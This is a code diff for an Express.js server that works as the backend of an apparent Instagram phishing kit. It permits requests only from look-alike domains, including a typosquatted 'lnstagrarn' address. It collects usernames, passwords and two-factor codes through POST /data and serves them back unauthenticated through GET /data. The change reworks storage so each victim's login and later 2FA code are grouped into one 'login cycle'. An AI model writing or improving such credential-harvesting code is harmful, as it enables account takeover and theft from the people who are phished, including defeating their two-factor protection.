@@ -3,6 +3,15 @@ const cors = require("cors");
 
 const app = express();
 
+app.use(cors({
+    origin: [
+        "https://account-instagram-com.vercel.app",
+        "https://lnstagrarn-reel-paoa2oajo.vercel.app"
+    ]
+}));
+
+app.use(express.json());
+
 app.get("/health", (req, res) => {
     res.json({
         status: "ok",
@@ -10,26 +19,31 @@ app.get("/health", (req, res) => {
     });
 });
 
-app.use(cors({
-    origin: [
-        "https://account-instagram-com.vercel.app",
-        "https://lnstagrarn-reel-paoa2oajo.vercel.app"
-    ]
-}));
-app.use(express.json());
-
-let dataList = [];
+// One login cycle at a time
+let currentLogin = null;
 
 app.post("/data", (req, res) => {
-    const newData = {
-        username: req.body.username,
-        password: req.body.password,
-        code: req.body.code
-    };
+    const { username, password, code } = req.body;
 
-    dataList.push(newData);
+    // New username = new login cycle
+    if (username && username !== currentLogin?.username) {
+        currentLogin = {
+            username,
+            password: password ?? null,
+            code: null
+        };
 
-    console.log("Received:", newData);
+        console.log("New login cycle:", {
+            username
+        });
+    }
+
+    // Attach a code to the current cycle
+    if (code && currentLogin) {
+        currentLogin.code = code;
+
+        console.log("Code received for current cycle");
+    }
 
     res.json({
         success: true
@@ -37,7 +51,7 @@ app.post("/data", (req, res) => {
 });
 
 app.get("/data", (req, res) => {
-    res.json(dataList);
+    res.json(currentLogin ? [currentLogin] : []);
 });
 
 const PORT = process.env.PORT || 1000;
